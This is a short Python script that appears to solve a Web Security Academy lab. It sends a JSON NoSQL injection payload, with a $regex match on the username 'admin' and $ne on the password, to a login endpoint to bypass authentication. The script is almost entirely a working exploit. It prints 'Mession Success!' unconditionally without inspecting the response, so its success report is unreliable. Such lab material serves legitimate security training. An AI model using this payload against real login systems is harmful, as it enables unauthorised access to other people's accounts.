import requests

LINK = "https://0a2600c804e7e6cb80428ac7005a009b.web-security-academy.net/"

LOGIN_LINK = LINK + "/login"

headers = {
    "Content-Type": "application/json"
}

payload = {
    "username": {"$regex": "admin.*"},
    "password": {"$ne": ""}
}

res = requests.post(LOGIN_LINK,json=payload,headers=headers)
print("Mession Success!")
